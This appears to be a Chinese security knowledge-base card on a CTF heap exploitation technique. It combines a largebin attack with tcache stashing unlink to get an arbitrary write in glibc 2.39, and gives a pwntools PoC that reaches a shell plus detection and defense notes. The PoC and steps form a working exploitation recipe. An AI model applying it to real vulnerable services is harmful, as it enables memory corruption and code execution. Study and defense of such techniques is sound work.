---
id: binary-pwn-heap-tcache-stashing-unlink-largebin-fake-chunk-arbitrary-write
title: 无 show 堆题：largebin attack 预置 bk + tcache stashing unlink 将固定 mmap 地址塞入 tcache
type: scenario
domain: binary
path: binary/pwn/heap
technique: tcache-stashing-unlink-largebin-fake-chunk-arbitrary-write
aliases:
- tcache stashing unlink
- largebin attack 预置 bk
- 无 show 任意地址写
- house of water 变体
- fake smallbin chunk
- tcache 塞入固定地址
tags:
- pwn
- heap
- glibc
- tcache
- smallbin
- largebin
- arbitrary-write
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V127
  verified_at: '2026-11-06T04:08:29+08:00'
  notes: 已对照原文与4张图核对：smallbin 6×0xa0（图01）、largebin attack 后 admin+8 写入堆指针 0x5d3d3c6768b0（图02）、tcache 0xa0 链出现 0x1337000（图03）、whoami=byt3 拿 shell（图04）均与卡片一致；原理（bk 预置+bk_nextsize 写 target+8）与 exp 偏移一致。未验证点：PoC 为原文 exp 精简，未本机复跑；glibc 2.39 为靶场环境非受影响版本，未设 affected_versions；frontmatter 无 sources/source_url。
---

## 一句话结论

堆题没有 `show`、无法泄露堆地址时，可以先用 largebin attack 在目标地址对应的 fake chunk 的 `bk` 字段预置一个合法堆指针，再把 smallbin 中某个 chunk 的 `bk` 篡改成“目标地址 - 0x10”；触发 tcache stashing unlink 后，这个 fake chunk 会被当作 smallbin 节点放进 tcache，随后 `malloc` 直接返回目标地址，`edit` 即可写入任意值。

## 原理

- tcache stashing unlink 发生在 `_int_malloc` 从小 bin 往 tcache 填充时，核心循环：
  ```c
  while (tcache->counts[tc_idx] < mp_.tcache_count && (tc_victim = last(bin)) != bin) {
      bck = tc_victim->bk;
      bin->bk = bck;
      bck->fd = bin;          // 对 bck 解引用，要求 bck 是合法指针
      tcache_put(tc_victim, tc_idx);
  }
  ```
  如果把某个 smallbin chunk 的 `bk` 改成 `target - 0x10`，第一轮会写 `*(target) = bin` 并把 `bin->bk` 改成 `target - 0x10`；下一轮 `last(bin)` 就变成这个 fake chunk（chunk 头在 `target - 0x10`，用户数据正好在 `target`）。
- 但下一轮会读取 fake chunk 的 `bk`（`target - 0x10 + 0x18 = target + 0x8`）并执行 `bck->fd = bin`。若 `target + 0x8` 里是垃圾，会直接崩溃，走不到 `tcache_put(fake chunk)`。
- 因此需要预先在 `target + 0x8` 写一个合法堆指针。largebin attack 正好提供“把 chunk 指针写到指定地址”的一次写：
  - 目标地址为 `target + 0x8`，把 largebin chunk 的 `bk_nextsize` 设为 `(target + 0x8) - 0x20 = target - 0x18`；
  - 再插入一个更小的 largebin chunk 触发链表更新，glibc 会把 chunk 地址写到 `target + 0x8`。
- 之后 fake chunk 被 `tcache_put` 放进 tcache；tcache 是 LIFO，按分配次数取到 `target` 后，`edit` 就能改写该地址。原文目标是一块固定 `mmap` 的 `admin` 指针（0x1337000），写入 magic 后调用 `win()` 执行 `system("/bin/sh")`。
- 为什么能绕过 safe-linking：safe-linking 保护的是 tcache/fastbin 的 `next`；smallbin/largebin 的 `bk` 不在保护范围内，因此可被直接改成任意地址。

## 触发条件

- glibc 含 tcache stashing unlink 逻辑（2.29+；原文靶场为 glibc 2.39-0ubuntu8.5）。
- 存在 UAF 或 edit-after-free，能修改已释放 smallbin chunk 的 `bk`；同时能构造 largebin 并修改其 `bk_nextsize`。
- 目标地址（如固定 `mmap` 的全局指针、BSS 变量、GOT 等）可写，且 `target - 0x10` 与 `target + 0x8` 所在页可访问。
- 程序有可触发的后门/校验（如 `*admin == magic` 后 `system("/bin/sh")`），或能把目标地址用于后续劫持。
- 没有 `show` 也可行；本手法不需要泄露堆地址。

## 利用步骤

1. 堆风水：先填满 tcache（7 个 0x90 chunk），再 free 6 个同尺寸 chunk 进 unsorted，随后申请一个大 chunk 触发排序，使这 6 个 chunk 进入 smallbin；每个 smallbin chunk 后放一个 0x20 guard 防止合并。
2. largebin attack：申请 0x420/0x400/0x410/0x400 等 large chunk，free 一个后申请更大的 chunk 使其进入 largebin；free 另一个并编辑 largebin chunk，把 `bk` 设为 `target + 0xf0`（示例值）、`bk_nextsize` 设为 `target - 0x18`，再申请更大 chunk 触发写入，使 `target + 0x8` 变成合法堆地址。
3. 排空 tcache（申请 7 个 0x90），编辑 smallbin 中最后一个 chunk（UAF），把它的 `bk` 改成 `target - 0x10`。
4. 申请一个 0x90 chunk 触发 tcache stashing unlink；此时 fake chunk 进入 tcache。
5. 继续 `malloc`，直到返回 `target`；用 `edit` 写入目标值（如 magic、函数指针、ROP 数据）。
6. 触发后门/校验或调用被改写指针，拿 shell/执行代码。
7. 调试要点：在触发 stashing 后 `bins`/`tcachebins` 查看 `target` 是否在 0xa0 链中；若崩溃，检查 `target + 0x8` 是否为合法堆指针、`target - 0x10` 是否按 chunk 头对齐。

## PoC

最小步骤（索引/尺寸按题目接口调整，原文靶场 glibc 2.39）：

```python
from pwn import *

def malloc(idx, size): ...
def edit(idx, data): ...
def free(idx): ...
def menu(x): ...

TARGET = 0x1337000          # 固定 mmap 的 admin 指针

# 1) 7 个 tcache + 6 个 smallbin(0xa0)，guard 防合并
for i in range(7): malloc(i, 0x90)
for i in range(6):
    malloc(10 + i, 0x90)
    malloc(20 + i, 0x20)
for i in range(7): free(i)
for i in range(6): free(10 + i)
malloc(30, 0x490)            # 触发排序，0xa0 进入 smallbin

# 2) largebin attack：在 TARGET+8 预置合法堆指针
malloc(40, 0x420); malloc(41, 0x400)
malloc(42, 0x410); malloc(43, 0x400)
free(40); malloc(44, 0x430)  # 40 进入 largebin
free(42)
edit(40, flat({0x08: TARGET - 0x10 + 0x100,
               0x18: TARGET - 0x20 + 0x8}, filler=b"\x00", length=0x420))
malloc(45, 0x430)            # 触发 largebin attack，TARGET+8 = heap ptr

# 3) 排空 tcache，篡改 smallbin bk
for i in range(7): malloc(i, 0x90)
edit(15, flat({0x08: TARGET - 0x10}, filler=b"\x00", length=0x90))

# 4) 触发 tcache stashing unlink，取出 TARGET
malloc(50, 0x90)
malloc(51, 0x90)
malloc(52, 0x90)             # 返回 TARGET

# 5) 写 magic 并触发后门
edit(52, flat({0x00: 0xdeadbeefdeadcafe}, filler=b"\x00", length=0x90))
menu(5)
```

说明：PoC 为原文 exp 的结构化精简，未在本机执行；仅用于授权测试。原文在 largebin attack 后还插入了一次 `malloc(46, 0x3d0)`，作者自述本地测试加不加不影响。

## 变体与关联

- 变体（目标）：House of Water 把 tcache 计数/entries 写进 `tcache_perthread_struct`；本手法把 fake chunk 放进 tcache 后落到任意固定地址，适合打 BSS 全局指针、`__free_hook`（旧 glibc）、GOT（Partial RELRO）或栈。
- 变体（预置 bk 的方式）：除 largebin attack 外，若有堆地址泄露/部分写，也可用其他任意写或 UAF 直接在 `target + 0x8` 放合法堆指针。
- 变体（触发方式）：smallbin 中留 2 个以上 chunk 才能让循环走到 fake chunk；tcache 需先排空，否则 stashing 提前停止。
- 关联：[[binary-pwn-heap-largebin-attack-mp-tcache-bins-stack-rop]]（largebin attack 改 `mp_.tcache_bins`）、[[binary-pwn-heap-house-of-botcake-tcache-poison]]（填满 tcache + unsorted 合并绕过 double free）、[[ctf-pwn-tcache-poison-global-note-array-flagbuf-print]]（tcache poison 打全局数组）。
- 边界：glibc 版本对 `tcache_put`/bin 完整性检查不同；`target - 0x10` 必须能按 chunk 头解析，`target + 0x8` 必须可读写；若 tcache 未排空或 smallbin 数量不足，fake chunk 不会被取出。

## 检测与防御

- 检测：堆题/服务中出现对已释放 chunk 的 `bk`/`bk_nextsize` 的异常修改；tcache 链中出现非堆地址（如固定 mmap/BSS 地址）；`malloc` 返回全局数据区地址。
- 防御：修复 UAF/edit-after-free，删除后清空指针；`create/update` 严格校验索引、尺寸与生命周期；敏感全局指针不要放在固定可预测的 mmap 地址。
- 加固：使用 glibc 2.39+ 的 safe-linking 与 tcache key，并关注 bin 链表完整性检查；开启 `MALLOC_CHECK_`、ASAN 或 hardened allocator；对固定地址映射加 `PROT_NONE` 守卫页。
- CTF/研究：用 GDB 观察 `tcachebins` 与 smallbin 的 `bk`，确认 fake chunk 入链位置；不同 glibc 版本需重新核对 `tcache_put` 与 largebin 插入的检查逻辑。
